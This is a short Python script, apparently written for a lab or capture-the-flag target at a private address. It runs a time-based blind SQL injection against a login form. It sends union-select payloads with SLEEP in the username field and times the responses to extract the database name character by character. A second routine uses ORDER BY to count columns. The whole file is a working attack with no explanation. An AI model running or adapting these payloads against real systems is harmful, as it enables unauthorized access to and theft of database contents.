import requests, string, time

#SELECT IF(SUBSTRING((SELECT DATABASE()),1,1)='a', SLEEP(5), NULL);


def requisicao(query):
    url = 'http://10.10.0.32/'
    dados = {'username':query, 'password':'qualquercoisa'}
    req = requests.post(url, data=dados)
    return req.text

def fuzz():
    printables = string.printable
    nome_db = ''
    while True:
        for char in printables:
            teste_db = nome_db + char
            query = "' union select 1, 2, if(substring((select database()),1,"+str(len(teste_db))+")='"+teste_db+"',sleep(3), NULL)"
            print(teste_db)
            antes = time.time()
            requisicao(query)
            depois = time.time()
            total = int(depois - antes)
            if total >= 3:
                nome_db = teste_db
                break

def orderby():
    numeros = list({1,2,3,4,5,6,7,8,9,10})

    for num in numeros:
        query = "' or 1=1 order by "+ str(num) + ' -- -'
        response = requisicao(query)
        if "Username or password is invalid" in response:
            print(f'Total de colunas eh: {str(num - 1)}')
            break

fuzz()